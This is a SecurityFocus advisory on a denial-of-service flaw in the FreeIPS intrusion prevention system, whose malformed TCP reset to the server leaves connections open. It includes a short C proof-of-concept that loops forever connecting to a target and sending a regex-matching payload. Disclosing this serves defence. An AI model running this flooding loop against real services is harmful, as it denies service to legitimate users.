source: http://www.securityfocus.com/bid/10541/info

It is reported that FreeIPS is susceptible to a denial of service vulnerability.

FreeIPS scans TCP connections for particular strings, defined by regular expressions. If a packet matches the regular expression, FreeIPS assumes malicious intent and attempts to close the TCP connection. It accomplishes this by sending TCP RST packets to both the client (attacker) and the server (victim TCP server).

The software correctly generates a TCP RST+ACK packet to the originating client, but the packet sent to the server is incorrectly generated. The packet sent to the server contains invalid sequence and acknowledgment numbers and is ignored.

An attacker can deny service to any TCP application protected by FreeIPS, denying network service to legitimate users.

The attacker would have to know or guess a string pattern that matches a regular expression in FreeIPS to successfully exploit this vulnerability.

int main(int argc, char *argv[])
{
        int sockfd, pass=0, len;
        struct sockaddr_in server;

        if (argc < 4)
        {
                printf ("USAGE: %s IP port payload [paylen]\n", argv[0]);
                exit(1);
        }
        if (argc > 4)
                len = atoi(argv[4]);
        else
                len = strlen(argv[3]);

        server.sin_addr.s_addr = inet_addr(argv[1]);
        server.sin_port = htons(atoi(argv[2]));
        server.sin_family = AF_INET;

        while (1)
        {
                printf("pass: %d\n", ++pass);
                if ((sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
                {
                        perror("socket");
                        exit(1);
                }

                if (connect(sockfd, (struct sockaddr *)&server, sizeof(struct sockaddr_in)) < 0)
                {
                        perror("connect");
                        continue;
                }

                if (send(sockfd, argv[3], len, 0) != len)
                {
                        perror("send");
                        exit(1);
                }

                close(sockfd);
        }
}